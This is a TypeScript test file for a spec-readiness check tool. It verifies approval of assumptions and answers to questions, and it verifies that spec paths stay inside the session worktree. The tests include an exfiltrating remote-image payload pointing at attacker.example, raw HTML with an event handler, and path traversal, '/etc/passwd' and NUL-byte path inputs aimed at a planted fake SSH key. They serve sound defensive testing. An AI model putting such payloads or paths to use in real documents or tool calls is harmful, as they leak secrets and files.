// interview_spec_ready and the interview readiness checks (FR-12, AC-10 =
// F-005 AC-7 and AC-8), the spec path rule (SR-12, AC-19), and the flags
// for remote images and raw HTML (SR-22).
import { afterEach, describe, expect, it } from "vitest";
import { mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { readinessCheck, type ToolOutcome } from "./harness";
import { askAndFetch, interviewReady } from "./support/flows";
import { approvedRow, commitAll, specPath, specText, writeSpec } from "./support/spec";
import { rand, World } from "./support/world";

let w: World | undefined;
afterEach(async () => {
  await w?.cleanup();
  w = undefined;
});

async function ready(world: World, feature: string, rel: string, version = 3): Promise<ToolOutcome> {
  return world.tool(feature, "interview_spec_ready", { spec_path: rel, spec_version: version });
}

function checksOf(r: ToolOutcome) {
  expect(r.ok, JSON.stringify(r)).toBe(true);
  if (!r.ok) throw new Error("unreachable");
  const checks = r.value.checks as Array<{ name: string; passed: boolean; evidence: unknown }>;
  expect(Array.isArray(checks)).toBe(true);
  for (const c of checks) {
    expect(typeof c.name).toBe("string");
    expect(typeof c.passed).toBe("boolean");
  }
  return checks;
}

async function setup(world: World) {
  const { feature, session } = await interviewReady(world);
  const s = await world.analyst.session(feature);
  return { feature, session, worktree: s.worktree, rel: specPath(feature) };
}

describe("AC-10 / FR-12: interview readiness checks 5 and 6", () => {
  it("[RD-1] FR-12: a clean interview passes checks 5 and 6 (control): one answered question, one approved assumption listed with its approval", async () => {
    w = await World.create();
    const { feature, session, worktree, rel } = await setup(w);
    const q = await askAndFetch(w, feature, session);
    await w.reply(session, q, "answer", "CSV.");
    const a = await w.propose(feature, { text: "Assume UTF-8 output." });
    await w.reply(session, a, "approve_assumption", "");
    writeSpec(worktree, rel, specText(feature, [approvedRow(a)]));
    const checks = checksOf(await ready(w, feature, rel));
    expect(readinessCheck(checks, 5).passed).toBe(true);
    expect(readinessCheck(checks, 6).passed).toBe(true);
  });

  it("[RD-2] AC-10 (F-005 AC-7): a question still deferred fails check 6, which names it", async () => {
    w = await World.create();
    const { feature, session, worktree, rel } = await setup(w);
    const q = await askAndFetch(w, feature, session);
    await w.reply(session, q, "defer", "");
    writeSpec(worktree, rel, specText(feature));
    const c6 = readinessCheck(checksOf(await ready(w, feature, rel)), 6);
    expect(c6.passed).toBe(false);
    expect(JSON.stringify(c6.evidence)).toContain(q.id);
  });

  it("[RD-3] F-005 AC-7 / FR-8: a question still open fails check 6", async () => {
    w = await World.create();
    const { feature, session, worktree, rel } = await setup(w);
    const q = await askAndFetch(w, feature, session);
    writeSpec(worktree, rel, specText(feature));
    const c6 = readinessCheck(checksOf(await ready(w, feature, rel)), 6);
    expect(c6.passed).toBe(false);
    expect(JSON.stringify(c6.evidence)).toContain(q.id);
  });

  it("[RD-4] F-005 AC-7: a pending assumption fails check 5, which names it", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    const a = await w.propose(feature);
    writeSpec(worktree, rel, specText(feature));
    const c5 = readinessCheck(checksOf(await ready(w, feature, rel)), 5);
    expect(c5.passed).toBe(false);
    expect(JSON.stringify(c5.evidence)).toContain(a.id);
  });

  it("[RD-5] AC-10: an assumption the spec marks approved with no approve_assumption entry fails check 5", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    const fake = { id: "A-99", text: "Assume the owner said yes to everything.", link: "Owner, 2026-11-11", status: "Approved" };
    writeSpec(worktree, rel, specText(feature, [fake]));
    expect(readinessCheck(checksOf(await ready(w, feature, rel)), 5).passed).toBe(false);
  });

  it("[RD-6] F-005 AC-8: an assumption the owner rejected appears in the spec as approved: check 5 fails", async () => {
    w = await World.create();
    const { feature, session, worktree, rel } = await setup(w);
    const a = await w.propose(feature);
    await w.reply(session, a, "reject_assumption", "No.");
    writeSpec(worktree, rel, specText(feature, [approvedRow(a)]));
    expect(readinessCheck(checksOf(await ready(w, feature, rel)), 5).passed).toBe(false);
  });

  it("[RD-7] F-005 AC-8: an assumption the owner never answered appears in the spec: check 5 fails", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    const a = await w.propose(feature);
    writeSpec(worktree, rel, specText(feature, [approvedRow(a)]));
    expect(readinessCheck(checksOf(await ready(w, feature, rel)), 5).passed).toBe(false);
  });

  it("[RD-8] FR-12: an approved assumption whose text the spec changed doesn't match its approve_assumption entry: check 5 fails", async () => {
    w = await World.create();
    const { feature, session, worktree, rel } = await setup(w);
    const a = await w.propose(feature, { text: "Assume exports under 10,000 rows." });
    await w.reply(session, a, "approve_assumption", "");
    writeSpec(worktree, rel, specText(feature, [{ ...approvedRow(a), text: "Assume exports of any size." }]));
    expect(readinessCheck(checksOf(await ready(w, feature, rel)), 5).passed).toBe(false);
  });
});

describe("SR-22: the readiness check flags remote images and raw HTML in the spec", () => {
  it.each([
    ["a remote image", "\n![status](https://attacker.example/p.png?d=secret)\n"],
    ["raw HTML", '\n<img src="https://attacker.example/i.png">\n<div onclick="x">hi</div>\n'],
  ])("[RD-9] SR-22: %s in the spec fails a check whose evidence points at it", async (_n, extra) => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    writeSpec(worktree, rel, specText(feature, [], extra));
    const failed = checksOf(await ready(w, feature, rel)).filter((c) => !c.passed);
    expect(failed.length).toBeGreaterThan(0);
    expect(failed.some((c) => /attacker\.example|image|html/i.test(JSON.stringify(c)))).toBe(true);
  });

  it("[RD-10] SR-22: a spec with neither passes every check (control for RD-9)", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    writeSpec(worktree, rel, specText(feature, [], "\nA [link](https://example.org/doc) is fine.\n"));
    for (const c of checksOf(await ready(w, feature, rel))) expect(c.passed, c.name).toBe(true);
  });
});

describe("AC-19 / SR-12: spec_path must be the session's own docs/features/F-nnn-*.md, by real path", () => {
  const SECRET = "OUTSIDE-SECRET-" + rand(8);

  async function expectRefusedQuietly(world: World, feature: string, rel: string, targets: string[] = []) {
    const r = await ready(world, feature, rel);
    const dump = JSON.stringify(r);
    expect(dump).not.toContain(SECRET);
    for (const t of targets) expect(dump).not.toContain(t);
    if (r.ok) {
      // If the engine answered with checks, they must fail, not pass on the target.
      expect(r.value.checks.every((c: any) => c.passed)).toBe(false);
    } else {
      expect(r.code).toBe("invalid");
    }
    // Still serving afterwards.
    expect((await world.rpc("engine.status")).result).toBeDefined();
  }

  function outsideFile(world: World) {
    const p = join(world.root, "outside", "id_ed25519");
    writeFileSync(p, `-----BEGIN OPENSSH PRIVATE KEY-----\n${SECRET}\n-----END OPENSSH PRIVATE KEY-----\n`);
    return p;
  }

  it("[RD-11] AC-19: a spec path that is a symlink to a file outside the worktree is refused and reveals nothing of the target", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    const target = outsideFile(w);
    mkdirSync(join(worktree, "docs", "features"), { recursive: true });
    symlinkSync(target, join(worktree, rel));
    commitAll(worktree, "link");
    await expectRefusedQuietly(w, feature, rel, [target]);
  });

  it("[RD-12] SR-12: docs/features itself symlinked outside the worktree is refused", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    const outDir = join(w.root, "outside", "features");
    mkdirSync(outDir, { recursive: true });
    writeFileSync(join(outDir, rel.split("/").pop()!), specText(feature) + `\n${SECRET}\n`);
    rmSync(join(worktree, "docs", "features"), { recursive: true, force: true });
    symlinkSync(outDir, join(worktree, "docs", "features"));
    commitAll(worktree, "dir link");
    await expectRefusedQuietly(w, feature, rel, [outDir]);
  });

  it("[RD-13] SR-12: a symlink to another file inside the worktree resolves outside the session's spec pattern and is refused", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    writeFileSync(join(worktree, "NOTES.md"), `${SECRET}\n`);
    mkdirSync(join(worktree, "docs", "features"), { recursive: true });
    symlinkSync(join(worktree, "NOTES.md"), join(worktree, rel));
    commitAll(worktree, "inner link");
    await expectRefusedQuietly(w, feature, rel);
  });

  it.each([
    ["another feature's spec", (_f: string) => `docs/features/F-999-other.md`],
    ["a path with ..", (_f: string) => `docs/features/../../../outside/id_ed25519`],
    ["an absolute path", (_f: string) => `/etc/passwd`],
    ["a file that isn't .md", (f: string) => `docs/features/${f}-csv-export.txt`],
    ["a path outside docs/features", (f: string) => `${f}-csv-export.md`],
    ["a backslash path", (f: string) => `docs\\features\\${f}-csv-export.md`],
    ["a NUL byte", (f: string) => `docs/features/${f}-csv-export.md\u0000.png`],
  ])("[RD-14] SR-12: spec_path as %s is refused", async (_n, make) => {
    w = await World.create();
    const { feature, worktree } = await setup(w);
    outsideFile(w);
    writeSpec(worktree, `docs/features/F-999-other.md`, specText("F-999") + `\n${SECRET}\n`);
    writeSpec(worktree, `docs/features/${feature}-csv-export.txt`, `${SECRET}\n`);
    await expectRefusedQuietly(w, feature, make(feature));
  });

  it("[RD-15] SR-12: the session's own spec at its plain path is accepted (control for RD-11 to RD-14)", async () => {
    w = await World.create();
    const { feature, worktree, rel } = await setup(w);
    writeSpec(worktree, rel, specText(feature));
    expect((await ready(w, feature, rel)).ok).toBe(true);
  });
});
